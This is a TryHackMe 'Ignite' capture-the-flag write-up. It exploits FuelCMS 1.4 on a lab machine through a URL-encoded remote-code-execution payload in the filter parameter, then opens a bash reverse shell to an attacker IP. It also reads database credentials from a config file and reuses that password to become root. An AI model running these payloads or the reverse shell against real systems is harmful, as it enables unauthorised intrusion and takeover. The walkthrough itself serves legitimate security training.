---
title: Ignite
description: 'Exploiting FuleCMS v1.4 and escalating to root with password reuse'
pubDate: 2024-05-18
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/676cb3273c613c9ba00688162efc0979.png'
---

Default user/pass (admin:admin) are used for login at `/fuel`

## RCE

Searching for an exploit we find: https://github.com/AssassinUKG/fuleCMS

Looking at the srouce (`https://github.com/AssassinUKG/fuleCMS/blob/main/fuelCMS.py`) we see that the `?filter` parameter can be used to execute arbitrary commands.

In Burp we can better see the output of this command:
```
http://10.10.243.105/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27ls%20-la%27)%2B%27
```

```bash
...[snip]...
systemtotal 52
drwxrwxrwx 4 root root  4096 Jul 26  2019 .
drwxr-xr-x 3 root root  4096 Jul 26  2019 ..
-rw-r--r-- 1 root root   163 Jul 26  2019 .htaccess
-rwxrwxrwx 1 root root  1427 Jul 26  2019 README.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 assets
-rwxrwxrwx 1 root root   193 Jul 26  2019 composer.json
-rwxrwxrwx 1 root root  6502 Jul 26  2019 contributing.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel
-rwxrwxrwx 1 root root 11802 Jul 26  2019 index.php
-rwxrwxrwx 1 root root    30 Jul 26  2019 robots.txt
...[snip]...
```

## Shell

```bash
bash -c "bash -i >& /dev/tcp/10.8.119.137/4444 0>&1"
```
URL encode and use in the RCE url:
```
http://10.10.243.105/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%38%2e%31%31%39%2e%31%33%37%2f%34%34%34%34%20%30%3e%26%31%22%27)%2B%27
```


## Privesc

The database credentials are:

```bash
cat /var/www/html/fuel/application/config/database.php
...[snip]...
'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
...[snip]...
```

We can use this password to switch to the root user:

```bash
su # <- mememe
```

